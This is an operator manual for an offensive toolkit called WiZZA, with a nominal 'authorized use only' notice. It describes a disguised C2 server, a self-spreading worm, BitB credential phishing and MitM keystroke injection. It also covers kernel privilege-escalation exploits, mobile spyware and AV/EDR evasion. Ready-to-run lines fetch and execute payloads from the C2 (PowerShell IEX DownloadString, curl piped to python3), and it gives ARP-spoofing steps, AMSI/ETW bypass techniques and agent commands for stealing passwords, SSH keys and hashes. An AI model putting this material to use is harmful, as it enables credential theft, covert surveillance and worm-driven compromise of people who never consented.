---
title: "WiZZA — Penetration Testing Toolkit"
subtitle: "Complete Operator Manual · Architecture · Guides · Troubleshooting"
author: "Authorized Use Only — Internal Documentation"
date: "2026"
geometry: "margin=2.5cm"
fontsize: 11pt
toc: true
toc-depth: 3
numbersections: true
colorlinks: true
linkcolor: "blue"
urlcolor: "blue"
toccolor: "black"
header-includes:
  - \usepackage{fancyhdr}
  - \usepackage{xcolor}
  - \usepackage{listings}
  - \usepackage{mdframed}
  - \pagestyle{fancy}
  - \fancyhf{}
  - \fancyhead[L]{\textbf{WiZZA Penetration Testing Toolkit}}
  - \fancyhead[R]{\textit{AUTHORIZED USE ONLY}}
  - \fancyfoot[C]{\thepage}
  - \definecolor{codebg}{HTML}{F5F5F5}
  - \definecolor{warnbg}{HTML}{FFF3CD}
  - \definecolor{infobg}{HTML}{D1ECF1}
  - \lstset{basicstyle=\footnotesize\ttfamily,breaklines=true,backgroundcolor=\color{codebg}}
---

\newpage

# Preface

**WiZZA** is a comprehensive, integrated penetration testing framework for authorized security assessments. It combines phishing, man-in-the-middle interception, C2 infrastructure, worm agents, kernel privilege escalation, mobile device attacks, shellcode generation, and AV/EDR evasion into a single coherent toolkit controlled through one CLI.

> **LEGAL NOTICE:** This toolkit is designed exclusively for authorized penetration testing, red team engagements, CTF competitions, and security research. Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical. Always obtain written authorization before any engagement.

---

# Architecture Overview

## System Topology

```
+-----------------------------------------------------------------+
|                        OPERATOR MACHINE (Kali)                   |
|                                                                   |
|  start CLI --> C2 Server :8888 --> cloudflared tunnel           |
|       |             |                      |                      |
|       |         /panel (UI)         https://xyz.trycloudflare.com|
|       |         /download/*                |                      |
|       |         /cdn-cgi/apps/*            |                      |
|       |                                    |                      |
|  +----+------------------------------------+                     |
|  |  Modules                                                       |
|  +- op/c2/c2_server.py          C2 server + web panel            |
|  +- op/payloads/                Baked agent payloads              |
|  +- op/evade/poly_engine.py     Per-request mutation engine       |
|  +- op/evade/stego.py           Steganography                     |
|  +- op/evade/stealth.py         Anti-forensics helpers            |
|  +- op/exploit/                 PDF, Office, browser exploits     |
|  +- op/kernel/exploits/         Kernel CVE sources                |
|  +- op/mobile/                  Android APK, iOS MDM              |
|  +- op/mitm/                    MitM proxy hooks                  |
|  +- op/bitb/                    Browser-in-the-Browser            |
+-----------------------------------------------------------------+
                                  |
              +-------------------+--------------------+
              v                   v                    v
      VICTIM (Windows)    VICTIM (Linux/Mac)    VICTIM (Mobile)
      worm_agent.ps1      worm_agent.py         APK / MDM / JS
      AMSI+ETW patch      SSH/USB spread        GPS/mic/camera
      WMI exec            DoH C2 fallback       JS keylogger
      Registry persist    cron/systemd persist
```

## Component Relationships

| Component | Language | Port | Role |
|-----------|----------|------|------|
| `start` | Bash | — | Master CLI, orchestrates everything |
| `c2_server.py` | Python 3 | :8888 | Agent listener, web panel, loot storage |
| `worm_agent.py` | Python 3 | — | Multi-vector worm for Linux/Mac/Windows |
| `worm_agent.ps1` | PowerShell | — | Windows-optimized worm + agent |
| `stage1.ps1` / `stage1.py` | PS1/PY | — | Tiny first-stage stagers |
| `poly_engine.py` | Python 3 | — | Multi-layer mutation engine |
| `stego.py` | Python 3 | — | PNG LSB + JPEG EXIF payload hiding |
| `bitb/catcher.py` | Python 3 | :8082 | Browser-in-the-Browser catcher |
| `mitm/catcher.py` | Python 3 | :9999 | Keystroke log receiver |
| `mitm/intercept.py` | Python 3 | :8083 | mitmproxy JS injection hook |
| `gen_shellcode.py` | Python 3 | — | msfvenom/NASM/PS1 shellcode generator |
| `kernel/exploits/*.c` | C | — | Kernel LPE exploits (8 CVEs) |

## Communication Protocols

### Agent -> C2 (HTTP polling)

```
Registration:
  GET /cdn-cgi/apps/init?v=<aid>&os=<os>&hostname=<host>&user=<user>&type=<type>
  Response: XOR-encrypted "OK"

Polling:
  GET /cdn-cgi/apps/sync?v=<aid>
  Response: XOR-encrypted command (or empty for PING)

Result submission:
  POST /cdn-cgi/apps/data
  Body: d=<XOR-b64-encoded-result>&v=<aid>

XOR key derivation:
  key = SHA256(agent_id)[0:16]   <- unique per infected host
```

### Traffic Disguise

All C2 traffic is disguised as Cloudflare CDN traffic:

- Routes: `/cdn-cgi/apps/*` (mimics Cloudflare's own internal paths)
- Headers: `Server: cloudflare`, `CF-RAY: <16 hex chars>-AMS`, `CF-Cache-Status: HIT`
- User-Agent: Full Chrome 124 browser fingerprint including `Sec-Fetch-*` headers
- Content-Type: `application/javascript` with filename `bundle.js`

\newpage

# Installation and Setup

## Prerequisites

### Required Tools

```bash
# Core (all Kali Linux installations)
python3           # Runtime
bash              # Shell
openssl           # Certificate generation

# Tunneling (install if missing)
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# MitM proxy
pip install mitmproxy

# Steganography
pip install Pillow
```

### Optional Tools

```bash
# Shellcode generation (primary backend)
# Already on Kali: msfvenom (part of metasploit-framework)
which msfvenom

# NASM (fallback shellcode compiler)
sudo apt-get install nasm

# Physical LAN attacks
sudo apt-get install dsniff bettercap
```

## First-Time Setup

### 1. Install Global Shortcuts

```bash
cd /home/heilige/Keylogger
bash start install
```

This creates:
- `~/.local/bin/start` — main CLI
- `~/.local/bin/worm` — worm control shortcut
- `~/.local/bin/c2` — C2 control shortcut
- `~/.local/bin/keylogger` — keylogger shortcut

Restart shell or run `source ~/.bashrc` to activate.

### 2. Configure Cloudflare Tunnel (One-Time)

For a persistent custom domain (instead of random trycloudflare.com URLs):

```bash
start domain
```

Follow the prompts to:
1. Authenticate with Cloudflare (`cloudflared login`)
2. Select your domain
3. Create a named tunnel

Configuration is saved to `~/.wizza_config`:
```
CF_TUNNEL_NAME=wizza-tunnel
CF_DOMAIN=c2.yourdomain.com
```

If you skip this step, WiZZA generates a random `trycloudflare.com` URL each session. This is fine for most engagements but the URL changes every run.

### 3. Verify Installation

```bash
start status         # Should show "no active processes"
start help           # Print full command reference
python3 op/evade/poly_engine.py --help    # Verify poly engine
python3 op/payloads/shellcode/gen_shellcode.py --list-payloads
```

## Directory Layout

```
/home/heilige/Keylogger/
+-- start                     <- Main CLI (run this)
+-- op/
|   +-- c2/
|   |   +-- c2_server.py      <- C2 server
|   +-- payloads/
|   |   +-- worm_agent.py     <- Python worm (template)
|   |   +-- worm_agent.ps1    <- PS1 worm (template)
|   |   +-- agent.py          <- Simple Python agent
|   |   +-- agent.ps1         <- Simple PS1 agent
|   |   +-- agent_http.py     <- Alias for agent.py
|   |   +-- stage1.ps1        <- PS1 first-stage stager
|   |   +-- stage1.py         <- Python first-stage stager
|   |   +-- stage1_stego.ps1  <- Stego-based PS1 stager
|   |   +-- SecureCertUpdate.hta  <- Windows HTA dropper
|   |   +-- shellcode/
|   |       +-- gen_shellcode.py   <- Shellcode generator
|   |       +-- revshell_x64.asm  <- NASM x64 shell source
|   +-- evade/
|   |   +-- poly_engine.py    <- Polymorphic mutation engine
|   |   +-- obfuscate_ps1.py  <- PS1 obfuscator
|   |   +-- obfuscate_py.py   <- Python obfuscator
|   |   +-- stego.py          <- Steganography
|   |   +-- stealth.py        <- Anti-forensics helpers
|   +-- exploit/
|   |   +-- gen_pdf.py        <- Malicious PDF generator
|   |   +-- gen_macro.py      <- Office macro generator
|   |   +-- browser_exploit.js<- Browser CVE hook
|   +-- kernel/
|   |   +-- exploits/         <- 8 kernel CVE sources
|   +-- mobile/               <- Android/iOS attack modules
|   +-- mitm/                 <- MitM proxy hooks
|   +-- bitb/                 <- BitB phishing
+-- WIZZA_MANUAL.pdf          <- This document
```

\newpage

# Command Reference

## Top-Level Commands

| Command | Description |
|---------|-------------|
| `start` | Interactive wizard — prompts for attack mode |
| `start help` | Full command reference |
| `start help2` | Detailed operator guide |
| `start install` | Create global shortcuts |
| `start domain` | Configure Cloudflare custom domain |
| `start up` | Launch BitB phishing catcher + tunnel |
| `start mitm` | Start MitM keylogger |
| `start payload` | Start C2 + tunnel + bake all agents |
| `start down` | Kill everything (tunnels, C2, proxy, ARP) |
| `start status` | Show running processes and tunnel URL |
| `start url` | Print active tunnel URL only |
| `start creds` | Watch captured credentials live (`tail -f`) |
| `start logs` | Tail all operation logs |
| `start theme [list|use|new|clone]` | Manage BitB phishing themes |
| `start edit <file>` | Open config/payload in editor |

## Specialized Modules

| Command | Description |
|---------|-------------|
| `start shellcode [gen|poly|stage1]` | Shellcode generation wizard |
| `start poly [ps1|py|all|shell|watch]` | Polymorphic mutation |
| `start evade [ps1|py|loader|check]` | AV/EDR evasion |
| `start untrack [stego]` | Stealth audit + hardening |
| `start exploit [office|pdf|browser]` | Exploit delivery |
| `start kernel [check|exploit|rootkit|ebpf]` | Kernel attacks |
| `start mobile [android|ios|browser|termux]` | Mobile attacks |
| `start physical <victim_ip> <domain>` | LAN ARP MitM (requires root) |

## Worm Control Shortcuts

```bash
worm drop             # Install worm on THIS machine (self-infect)
worm push <user@host> # Deploy via SSH
worm payload          # Show baked payload paths
worm usb              # Sync payloads to USB drive
worm status           # Check if worm is running locally
```

## C2 Control Shortcuts

```bash
c2 start              # Start C2 server on :8888
c2 stop               # Kill C2
c2 restart            # Stop and restart
c2 status             # Show agent count + credential summary
c2 log                # Tail C2 log
c2 panel              # Open web panel in browser
```

\newpage

# Module Guides

## BitB Phishing

### What It Does

Browser-in-the-Browser (BitB) creates a convincing fake login popup that overlays the victim's real browser. The popup is styled to perfectly mimic trusted login providers (Google, Microsoft, Facebook, Apple). The victim types their credentials into what appears to be a real authentication dialog — those credentials are captured immediately.

### When To Use

- Target uses OAuth/SSO login ("Sign in with Google", "Sign in with Microsoft")
- You have a pretext to send a link (phishing email, SMS, LinkedIn message)
- Remote engagement — no LAN access needed

### Quick Start

```bash
start up
```

This will:

1. Start the BitB catcher server on port :8082
2. Launch a cloudflared tunnel to expose it publicly
3. Print the tunnel URL
4. Begin watching for credentials

Send the tunnel URL to your target (via phishing email, LinkedIn, etc.).

### Themes

```bash
start theme list         # See available themes
start theme use google   # Switch to Google login theme
start theme use outlook  # Microsoft Outlook theme
start theme use facebook # Facebook theme
start theme use blank    # Blank template for customization
start theme new          # Create a new theme interactively
start theme clone <url>  # Clone appearance of any real login page
```

### Watching Credentials

```bash
start creds              # Live view of captured credentials
# Or directly:
tail -f ~/.wizza/logs/credentials.txt
```

**Example output:**
```
[2026-04-19 14:32:11] BITB    victim@gmail.com  :  P@ssw0rd123
[2026-04-19 14:32:11] SOURCE  https://xyz.trycloudflare.com
[2026-04-19 14:32:11] UA      Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

### Custom Domain

For more convincing delivery, configure a custom domain:

```bash
start domain            # One-time setup
# Then:
start up                # Uses CF_DOMAIN instead of random URL
```

A URL like `https://login.yourdomain.com` is far more convincing than a random trycloudflare.com URL.

---

## MitM Keylogger

### What It Does

Positions the attacker between the victim and their network gateway. All HTTP/HTTPS traffic flows through WiZZA's transparent proxy, which:
- Injects a JavaScript keylogger into every HTML page
- Captures all form submissions (usernames, passwords, search queries)
- Intercepts POST requests to login endpoints
- Optionally decrypts HTTPS if victim has installed the iOS MDM certificate

### When To Use

- You have physical or logical access to the target's network
- LAN engagement (corporate office, coffee shop, hotel WiFi)
- Victim has installed the WiZZA CA certificate (via iOS MDM profile)

### Requirements

```bash
sudo apt-get install dsniff bettercap   # ARP spoofing tools
# Must be run as root for iptables rules
```

### Quick Start

```bash
start mitm
# Prompts: target IP or subnet, target domain
# Starts: mitmproxy :8083, keystroke catcher :9999
```

For full LAN interception:

```bash
sudo start physical <victim_ip> <target_domain>
# Example: sudo start physical 192.168.1.50 example.com
```

This sets up:
1. ARP poisoning (`arpspoof`): victim <-> gateway
2. IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`
3. iptables redirect: `:80/:443` -> mitmproxy `:8080`
4. DNS spoof (`bettercap`): `target_domain` -> attacker IP

### Watching Keystrokes

```bash
tail -f ~/.wizza/logs/keystrokes.txt
# Or:
start logs               # Shows all logs including keystrokes
```

### iOS MitM (Full HTTPS Decryption)

If the victim has installed the WiZZA iOS MDM profile:

```bash
start mobile ios         # Generate MDM profile
# Victim installs via: https://c2url/m/ios
start mitm               # Start proxy with CA cert loaded
# All victim HTTPS is now decryptable
```

---

## C2 Agent Deployment

### What It Does

Deploys a persistent agent on the victim's machine. The agent:
- Registers with the C2 server via HTTPS polling
- Receives commands from the operator (via web panel or CLI)
- Executes commands and returns results
- Supports 40+ built-in commands (recon, screenshot, keylog, browser passwords, file exfil)
- Optional worm mode: spreads to other machines automatically

### Architecture

```
Operator Browser --> https://localhost:8888/panel
                              |
                         C2 Server :8888
                              |
              +---------------+---------------+
              v               v               v
         Agent 1          Agent 2         Agent 3
    (Windows PS1)    (Linux Python)  (Mac Python)
```

### Quick Start

```bash
start payload
```

This will:
1. Start the C2 server on port :8888
2. Launch a cloudflared tunnel
3. Bake the tunnel URL into all agent files
4. Generate `SecureCertUpdate.hta` (Windows dropper)
5. Display the tunnel URL and drop the operator into live log watch

### Baked Payload Files

After `start payload` completes, these files are ready in `~/.wizza/payloads/` (or `op/payloads/` if the script was run directly):

| File | Target OS | Delivery Method |
|------|-----------|-----------------|
| `worm_agent.py` | Linux / Mac / Windows | Email, SSH, USB, HTTP download |
| `worm_agent.ps1` | Windows | PowerShell, email, USB |
| `agent.py` | Linux / Mac / Windows | Simpler agent (no spreading) |
| `agent.ps1` | Windows | Simpler PS1 agent |
| `stage1.ps1` | Windows | Tiny 6-line dropper |
| `stage1.py` | Linux/Mac/Windows | Tiny 1-line dropper |
| `SecureCertUpdate.hta` | Windows | Double-click, email, USB |

### Delivering the Payload

**Option 1 — Smart Lure URL:**

The C2 serves a smart lure page at the LURE_PATH (default `/docs`). When a victim visits this URL, the server auto-detects their OS and serves the appropriate payload:
```
Windows User-Agent -> SecureCertUpdate.hta (or worm_agent.ps1)
Mac/Linux User-Agent -> agent.py
```

**Option 2 — Direct Download:**

Every payload is served at `/download/<filename>` with per-request polymorphic mutation:
```
https://xyz.trycloudflare.com/download/worm_agent.ps1
https://xyz.trycloudflare.com/download/worm_agent.py
https://xyz.trycloudflare.com/download/stage1.ps1
```

**Option 3 — HTA Dropper:**

On Windows, double-clicking `SecureCertUpdate.hta` silently runs a hidden PowerShell that downloads and executes the worm agent in memory.

**Option 4 — Office Macro:**

```bash
start exploit office
# Generates: invoice.docm / report.xlsm
# Contains AutoOpen macro that downloads + runs the agent
```

**Option 5 — Malicious PDF:**

```bash
start exploit pdf
# Generates: statement.pdf
# Opens a download prompt on PDF open
```

**Option 6 — Stage1 One-Liner:**

For quick console delivery when you already have a shell:
```powershell
# Windows PowerShell:
powershell -w h -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('https://c2url/download/stage1.ps1'))"

# Linux/Mac:
curl -s https://c2url/download/stage1.py | python3
```

### Web Panel

Open the C2 panel in your browser:
```
https://localhost:8888/panel
```

Or run: `c2 panel`

**Panel Tabs:**

- **Agents** — All registered agents with OS, hostname, username, privilege level, last seen
- **Command** — Send a command to a selected agent
- **Output** — View command results (stdout + stderr)
- **Loot** — Browse and download captured files
- **Worm Control** — Manage spreading (if agent is worm variant)
- **Credentials** — All captured passwords

### Agent Commands Reference

**Reconnaissance:**

| Command | Action |
|---------|--------|
| `RECON` | Full system dump: OS, users, network, processes, cron, env, interesting files |
| `SYSINFO` | Quick OS/hardware summary |
| `NETWORK` | Interfaces, routes, ARP table, open ports |
| `DRIVES` | All mounted drives with free space |

**Capture:**

| Command | Action |
|---------|--------|
| `SCREENSHOT` | Desktop screenshot (PNG, base64) |
| `WEBCAM` | Webcam frame capture (JPEG) |
| `CLIPBOARD` | Read clipboard contents |
| `KEYLOG_START` | Begin background keystroke capture |
| `KEYLOG_DUMP` | Download current keystroke buffer |

**Credential Harvesting:**

| Command | Action |
|---------|--------|
| `BROWSERS` | Chrome/Firefox saved passwords + history |
| `HASHDUMP` | `/etc/shadow` hashes (Linux) or SAM (Windows) |
| `SSHKEYS` | Collect all `~/.ssh/id_*` private keys |
| `EXFIL` | Exfiltrate home directory documents (PDF, DOCX, XLSX) |
| `GETFILE <path>` | Download a specific file |

**Post-Exploitation:**

| Command | Action |
|---------|--------|
| `PERSIST` | Install persistence (crontab, systemd, registry, shell RC) |
| `PRIVESC` | Check for local privesc (sudo -l, SUID, writable paths, kernel version) |
| `CLEAN` | Wipe command history + logs |
| `SELFDESTRUCT` | Delete agent, clear all traces, exit |

**Lateral Movement:**

| Command | Action |
|---------|--------|
| `NET_SCAN` | Scan /24 subnet for live hosts and open ports |
| `SSH_TARGETS` | Parse known_hosts + SSH config for targets |
| `SSH_SPRAY` | Password spray SSH targets |
| `SMB_SCAN` | Enumerate SMB shares |
| `GIT_POISON` | Inject malicious post-commit hooks in all repos |
| `EMAIL_SPREAD` | Email worm to extracted contacts |

**Windows-Specific:**

| Command | Action |
|---------|--------|
| `INJECT <base64_shellcode>` | Inject shellcode into svchost.exe |
| `RUN_PS <code>` | Execute AMSI-bypassed PowerShell |

---

## Worm Agent

### What It Does

The worm variant (`worm_agent.py` / `worm_agent.ps1`) extends the basic agent with automatic multi-vector spreading. Once deployed on one machine, it attempts to copy itself to other machines on the network.

### Spread Vectors

| Vector | Method | OS |
|--------|--------|----|
| USB | Detects removable drives, copies payload, creates lures | Win/Lin |
| SSH | Keys from `~/.ssh`, `known_hosts`, spray common passwords | Lin/Mac |
| SMB | Enumerate shares, copy payload via net use / impacket | Win/Lin |
| Git hooks | Inject `post-commit` / `post-merge` hooks in all local repos | All |
| Email | Extract Thunderbird/Outlook contacts, send phishing email | Win/Lin |
| Docker | Container escape via exposed socket, infect host | Lin |
| Network scan | Find SSH/SMB targets in local /24 subnet | All |

### Worm Control Commands

Send these from the C2 panel to any worm agent:

```
WORM_STATUS           — Show spread log and flag counts
WORM_PAUSE            — Pause all spreading threads
WORM_RESUME           — Resume spreading
WORM_STOP_SPREAD      — Permanently disable spreading
WORM_START_SPREAD     — Re-enable spreading
WORM_SPREAD_NOW       — Force immediate spread cycle
WORM_USB_ON           — Enable USB vector
WORM_USB_OFF          — Disable USB vector
WORM_SSH_ON           — Enable SSH vector
WORM_SSH_OFF          — Disable SSH vector
WORM_SET_C2 <url>     — Hot-swap the C2 URL without restart
WORM_SET_INTERVAL <n> — Change poll interval (seconds)
WORM_SKIP <host>      — Add host to permanent skip list
```

### Viewing the Infection Tree

In the C2 panel, open the **Worm Family** tab to see a graph of all infected hosts and how they are connected (who infected whom).

---

## Kernel Privilege Escalation

### What It Does

Provides compiled C exploit code for 8 public kernel CVEs. Used when you have a low-privilege shell on a Linux target and need to escalate to root.

### Vulnerability Check

```bash
start kernel check
```

This runs an automated scan that checks:
- Kernel version against known vulnerable ranges
- Running services and setuid binaries
- `sudo -l` output
- Writable paths in PATH
- Exposed Docker/LXC sockets
- NFS no_root_squash mounts

### Kernel Exploits Reference

| CVE | Kernel Versions | Technique | Reliability |
|-----|----------------|-----------|-------------|
| CVE-2016-5195 (DirtyCow) | 2.6.22 – 4.8.3 | Race condition, /etc/passwd write | High |
| CVE-2022-0847 (DirtyPipe) | 5.8 – 5.16.11 | Pipe flag override, read-only file write | High |
| CVE-2021-3493 (OverlayFS) | Ubuntu 5.0 – 5.10 | OverlayFS xattr copy-up | High (Ubuntu) |
| CVE-2023-0386 (OverlayFS2) | 5.11 – 6.2 | FUSE setuid copy-up | Medium |
| CVE-2021-4034 (PwnKit) | All distros | pkexec argv/envp trick | High |
| CVE-2024-1086 (nftables UAF) | 5.14 – 6.6 | nft_verdict double-free | Medium |
| CVE-2021-22555 (Netfilter) | 2.6.19 – 5.12 | OOB +2 write via msg_msg spray | Medium |
| CVE-2022-2588 (cls_route UAF) | 4.9 – 5.18 | UAF via netlink RTM_DELTFILTER | Medium |

### Exploiting a Target

```bash
start kernel exploit
```

Follow the interactive prompts to:
1. Select the CVE for your target kernel version
2. Compile the exploit (cross-compilation if needed)
3. Instructions for transferring to the target
4. Execute on target

**Manual compile:**
```bash
cd op/kernel/exploits/
gcc -o dirtycow dirty_cow.c -pthread -ldl
gcc -o dirtypipe dirty_pipe.c
gcc -o pwnkit_trigger pwnkit.c && gcc -shared -fPIC -o lol.so pwnkit.c -DPAYLOAD_ONLY
```

**Transfer to target via C2:**

From C2 panel, use `GETFILE` to verify the target's kernel version, then use shell access to wget/curl the exploit binary from the C2 server (serve it under `$PAYLOAD_DIR/`).

---

## Mobile Attacks

### Android APK

Generate a malicious APK that installs as a system update:

```bash
start mobile android
```

Prompts for:
- Listener IP (your C2 host or tunnel)
- Listener port (default 4444)
- Optional: bind to a legitimate APK (requires apktool)

Output: `~/.wizza/payloads/update.apk`

Delivery: Email attachment, fake app store link, QR code, USB sideload.

Listener setup (Metasploit):
```bash
msfconsole -q -x "
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST <your_ip>
set LPORT 4444
exploit -j"
```

### iOS MDM Profile

Install a custom CA certificate on victim's iPhone/iPad to enable HTTPS decryption:

```bash
start mobile ios
```

Prompts for:
- Proxy host (your IP or tunnel)
- Proxy port (default 8080)
- Organization name (e.g., "IT Security Dept.")
- Auto-proxy (PAC) vs. manual

Output:
- `~/.wizza/payloads/wizza.mobileconfig` — Send to victim
- `~/.wizza/wizza_ca.{key,crt,der}` — Keep private

Delivery:
1. Host `.mobileconfig` on HTTPS server: `GET /m/ios`
2. Send link to victim (SMS, email, QR code)
3. Victim: Settings -> Downloads -> Install -> Trust
4. Start MitM: `start mitm`

### Termux Agent (Android)

For Android devices with Termux installed:

```bash
start mobile termux
# Or: send the baked mobile_agent.py to victim
```

Capabilities:
- Shell command execution
- GPS location (`termux-location`)
- SMS read/send
- Microphone recording
- Camera snapshots
- Clipboard
- File exfiltration

### Browser Hook (No Install)

When you have MitM position, the `intercept.py` proxy automatically injects a JavaScript hook into every page:

```bash
start mitm       # starts proxy with JS injection
# Victim's browser now runs your hook on every page
```

Capabilities (no installation, works on iOS/Android):
- GPS (with browser permission prompt)
- Microphone recording
- Camera snapshots
- Clipboard read
- Full keystroke capture
- Form field capture
- Device fingerprinting
- ServiceWorker persistence (survives page navigation)

---

## Shellcode Generation

### What It Does

Generates raw x64 Windows reverse TCP shellcode in multiple formats, suitable for injection into a `VirtualAlloc`/`CreateThread` PS1 loader or C injection template.

### Quick Start

```bash
start shellcode gen
```

Interactive prompts for LHOST, LPORT, payload type, output format.

### Backends (auto-selected)

1. **msfvenom** (primary) — Best quality, available on all Kali installs
2. **NASM** (secondary) — Compiles `revshell_x64.asm` if msfvenom unavailable
3. **PS1 inline** (fallback) — PowerShell TCPClient shell if neither tool available

### Command Line

```bash
python3 op/payloads/shellcode/gen_shellcode.py \
    --lhost 10.10.10.10 \
    --lport 4444 \
    --payload shell \
    --format hex \
    --out shell.hex
```

### Payload Types

| Key | msfvenom Payload |
|-----|-----------------|
| `shell` | `windows/x64/shell_reverse_tcp` |
| `meterpreter` | `windows/x64/meterpreter_reverse_tcp` |
| `powershell` | `windows/x64/powershell_reverse_tcp` |
| `shell_bind` | `windows/x64/shell_bind_tcp` |
| `shell/staged` | `windows/x64/shell/reverse_tcp` |
| `meter/staged` | `windows/x64/meterpreter/reverse_tcp` |

### Output Formats

| Format | Description | Use Case |
|--------|-------------|----------|
| `hex` | Hex string | Feed into `start poly shell` |
| `raw` | Binary `.bin` | For C injectors |
| `ps1` | Complete PS1 loader (VirtualAlloc + CreateThread) | Run directly on victim |
| `py` | Python ctypes loader | Run on victim with Python |
| `c` | C byte array | Compile into custom injector |

### Poly-Wrapping Shellcode

Take raw shellcode and wrap it in a polymorphic AMSI-bypass PS1 decoder:

```bash
start shellcode poly
# Or:
start poly shell
# Paste hex or provide .bin/.hex file path
# Output: unique PS1 runner with 3-layer cipher + AMSI bypass + ETW patch
```

### Building Stage1 Stagers

```bash
start shellcode stage1
# Prompts for C2 URL
# Bakes into: stage1.ps1, stage1.py, stage1_stego.ps1
```

---

## Polymorphic Engine

### What It Does

Takes any PS1 or Python payload and produces a functionally identical but syntactically different version on every run. No two generated files have the same hash. Used to defeat signature-based AV/EDR.

### How It Works (3 Layers)

**Layer 1 — Multi-cipher encoding:**
```
plaintext -> XOR (rand key) -> RC4 (rand key) -> AES-CTR-sim (SHA256 keystream)
         -> base64 -> embedded decoder stub
```
Applied N times (configurable rounds, default 3). Each round adds another decode loop.

**Layer 2 — String mutation (8 types, randomly mixed):**

| Technique | Example |
|-----------|---------|
| Split concat | `"cmd"` -> `"c"+"m"+"d"` |
| Char array | `"cmd"` -> `[char[]]0x63,0x6d,0x64` |
| Base64 | `"cmd"` -> `[Convert]::FromBase64String('Y21k')` |
| Reversed | `"cmd"` -> `[string]::join('','dmc'[-1..-3])` |
| Hex chars | `"cmd"` -> `[char]0x63+[char]0x6d+[char]0x64` |
| Decimal chars | `"cmd"` -> `[char]99+[char]109+[char]100` |
| Env concat | `"cmd"` -> `$env:TEMP.Substring(0,0)+'cmd'` |

**Layer 3 — Control-flow flattening:**

Code blocks are shuffled into a state-machine dispatch loop:
```powershell
$_state = 4   # random entry point
while ($true) {
    switch ($_state) {
        4 { <block 3>; $_state = 7 }
        7 { <block 1>; $_state = 2 }
        2 { <block 2>; $_state = 0 }
        0 { break }
    }
}
```

The execution order is identical but the linear structure AV scanners expect is destroyed.

### AMSI Bypass Variants (rotated per run)

| Variant | Technique |
|---------|-----------|
| 1 | Reflection: `AmsiUtils.amsiInitFailed = true` |
| 2 | P/Invoke: `VirtualProtect` + patch `AmsiScanBuffer` return bytes |
| 3 | ScriptBlock logging cache invalidation |
| 4 | CLRJIT internal field patch |
| 5 | `WriteProcessMemory` self-patch |

### ETW Bypass Variants (rotated per run)

| Variant | Technique |
|---------|-----------|
| 1 | Patch `ntdll!EtwEventWrite` first byte -> `0xC3` (ret) |
| 2 | `EventProvider` reflection — null internal provider field |

### Usage

```bash
# Single file
start poly ps1           # mutate a PS1 payload
start poly py            # mutate a Python payload
start poly all           # mutate all payloads in the payloads dir

# Shellcode wrapper
start poly shell         # wrap raw shellcode in PS1 decoder stub

# Watch mode — re-mutate automatically on schedule
start poly watch         # prompts for dir + interval
```

**Command line:**
```bash
python3 op/evade/poly_engine.py --lang ps1 --in payload.ps1 --out evaded.ps1 --rounds 3
python3 op/evade/poly_engine.py --lang all --dir op/payloads/ --rounds 2
python3 op/evade/poly_engine.py --watch --dir op/payloads/ --interval 300
```

### Per-Request Mutation (C2)

The C2 server calls `_poly_mutate()` on **every download request**. Each time a victim's browser or agent polls `/download/worm_agent.ps1`, it receives a fresh unique file with a different hash. This defeats:
- Static signature AV (different bytes every time)
- Hash-based threat intel (no repeated file hash)
- Sandboxing (multiple samples look like different malware)

---

## Steganography (Stego)

### What It Does

Hides a payload inside an innocent image file. The image looks completely normal to the human eye and passes casual AV file-type scanning (it is a valid PNG or JPEG). Delivery looks like sharing a photo.

### PNG LSB Embedding

Embeds payload in the least-significant bits of the Red, Green, and Blue channels of every pixel. A 1200×800 image can hold approximately 450KB of payload.

```bash
# Embed payload into an image
python3 op/evade/stego.py --embed \
    --in op/payloads/worm_agent.ps1 \
    --auto-carrier \
    --out lure.png

# Output:
#   [+] Auto-carrier: /tmp/.wizza_carrier.png (1200x800)
#   [+] Embedded 12847 bytes into lure.png
#   [+] XOR key (save this!): abc123def456==
#   [+] Image: lure.png (1200x800)
#   [*] Generate extractor: python3 stego.py --gen-extractor ps1 --image-url <url> --key 'abc123def456=='

# Generate PS1 extractor stub (runs on victim, no Pillow needed)
python3 op/evade/stego.py --gen-extractor ps1 \
    --image-url https://cdn.example.com/lure.png \
    --key 'abc123def456==' \
    --out extract.ps1
```

### Stego Delivery Workflow

```bash
# 1. Embed payload into a PNG
start untrack stego
# -> generates lure.png + extract.ps1 + stage1_stego.ps1

# 2. Host the image somewhere convincing
# (C2 serves it, or upload to Imgur/GitHub/CDN)

# 3. Deliver extract.ps1 to victim
# (via macro, PDF, stage1, etc.)

# 4. Victim runs extract.ps1
# -> Downloads lure.png
# -> Extracts bits from RGB channels
# -> XOR-decrypts payload
# -> Executes fileless via [ScriptBlock]::Create().Invoke()
```

### Using stage1_stego.ps1

The stego stager is a self-contained PS1 that does everything in one file:

```powershell
# Victim runs:
powershell -w h -ep bypass -f stage1_stego.ps1
# -> Downloads image from __IMG_URL__
# -> Extracts and decrypts payload
# -> Executes worm_agent.ps1 fileless
```

Bake the image URL and key into stage1_stego.ps1 via:
```bash
start untrack stego    # Interactive wizard handles this
```

---

## AV/EDR Evasion

### Overview

Three tools for evading detection:

| Tool | Input | Technique |
|------|-------|-----------|
| `poly_engine.py` | PS1 or PY | Full mutation (3-layer cipher + CFG flattening + AMSI/ETW bypass) |
| `obfuscate_ps1.py` | PS1 | Selective obfuscation (lighter weight) |
| `obfuscate_py.py` | PY | marshal + XOR + zlib |

### Evasion Checklist

Run the stealth audit before any engagement:

```bash
start untrack
```

The audit checks all 6 stealth dimensions:

1. **Payload mutation** — Every payload must pass through poly engine before deployment
2. **CDN traffic disguise** — C2 comms use cloudflare CDN headers and routes
3. **Encrypted comms** — XOR with per-agent SHA256-derived key
4. **Timestomping** — Agent file timestamps match system binaries (svchost.exe / ls)
5. **Anti-forensics** — Log wipe, history clean, self-delete on CLEAN command
6. **Process masking** — Agent process name mimics kernel thread or system process

### AMSI Bypass Verification

Test AMSI bypass effectiveness on target Windows:

```powershell
# Run on target — if AMSI is patched, this should NOT alert:
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
# (If this runs silently, AMSI is working but isn't triggered; test with known AMSI string)
```

### ETW Bypass

After the `0xC3` patch to `EtwEventWrite`:
- All ETW events from that process are silenced
